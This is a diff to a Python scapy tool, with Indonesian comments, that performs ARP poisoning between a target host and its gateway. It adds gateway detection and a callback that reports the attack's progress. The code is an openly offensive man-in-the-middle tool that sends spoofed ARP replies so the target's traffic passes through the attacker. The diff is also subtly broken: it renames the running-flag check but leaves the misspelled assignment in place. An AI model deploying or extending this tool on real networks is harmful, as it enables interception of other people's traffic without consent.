@@ -27,6 +27,10 @@ def get_mac(ip):
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
     return ans[0][1].hwsrc
 
+def get_gateway_ip():
+    gateway = conf.route.route("0.0.0.0")[2]
+    return gateway
+
 def scapy_arp_scan(timeout=2, iface=None):
     """
     Lakukan ARP scan ke /24 berdasarkan IP lokal. memerlukan root
@@ -359,12 +363,14 @@ class ARPSpoofing:
         target_ip: str, # IP Target
         gateway_ip: str, # IP Gateway
         iface: Optional[str] = None, # Network interface, jika tidak ada set dfault None
-        interval: float = 2.0):
+        interval: float = 2.0,
+        on_packet: Optional[Callable] = None):
 
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.iface = iface
         self.interval = interval
+        self.on_packet = on_packet
         
         # Var untuk menyimpan MAC
         self.target_mac = None
@@ -421,9 +427,21 @@ class ARPSpoofing:
             return False
     
     def start(self, enable_forwarding: bool = True):
-        if self._runnning :
+        if self._running :
+            if self.on_packet:
+                try:
+                    self.on_packet("[ARPSpoofer] Already running!")
+                except Exception as e:
+                    print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
+                    
             print("[ARPSpoofer] Already running!")
             return
+        
+        if self.on_packet:
+            try:
+                self.on_packet("[ARPSpoofer] Starting ARP poisoning attack...")
+            except Exception as e:
+                print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
         
         print("\n[ARPSpoofer] Starting ARP poisoning attack...")     
         
@@ -431,10 +449,24 @@ class ARPSpoofing:
         self.gateway_mac = str(get_mac_address(ip=str(self.gateway_ip), network_request=True))
         
         if not self.target_mac:
+            if self.on_packet:
+                try:
+                    out = f"[ARPSpoofer] ✗ Could not find target MAC for {self.target_ip}"
+                    self.on_packet(out)
+                except Exception as e:
+                    print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
+            
             print(f"[ARPSpoofer] ✗ Could not find target MAC for {self.target_ip}")
             return False
         
         if not self.gateway_mac:
+            if self.on_packet:
+                try:
+                    out = f"[ARPSpoofer] ✗ Could not find gateway MAC for {self.gateway_ip}"
+                    self.on_packet(out)
+                except Exception as e:
+                    print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
+            
             print(f"[ARPSpoofer] ✗ Could not find gateway MAC for {self.gateway_ip}")
             return False
         
@@ -443,6 +475,16 @@ class ARPSpoofing:
             
         self._runnning = True
         self._poisoned = True
+        
+        if self.on_packet:
+            try:
+                self.on_packet(f"[ARPSpoofer] ✓ Poisoning started!")
+                self.on_packet(f"Telling {self.target_ip} that {self.gateway_ip} is at our MAC")
+                self.on_packet(f"Telling {self.gateway_ip} that {self.target_ip} is at our MAC")
+                self.on_packet(f"Sending ARP packets every {self.interval}s")
+                self.on_packet(f"[ARPSpoofer] Press Ctrl+C to stop and restore ARP tables")
+            except Exception as e:
+                print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
         
         print(f"\n[ARPSpoofer] ✓ Poisoning started!")
         print(f"  Telling {self.target_ip} that {self.gateway_ip} is at our MAC")
@@ -460,13 +502,19 @@ class ARPSpoofing:
                 self._spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                 
                 packet_count += 2
+                if self.on_packet:
+                    try:
+                        out = f"[ARPSpoofer] Sent {packet_count} ARP packets..."
+                        self.on_packet(out)
+                    except Exception as e:
+                        print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
                 print(f"[ARPSpoofer] Sent {packet_count} ARP packets...", end="\r")
                 
                 time.sleep(self.interval)
         except KeyboardInterrupt:
             print("\n[ARPSpoofer] Interrupted by user")
         finally:
-            self.stop
+            self.stop()
         return True
     
     def stop(self):
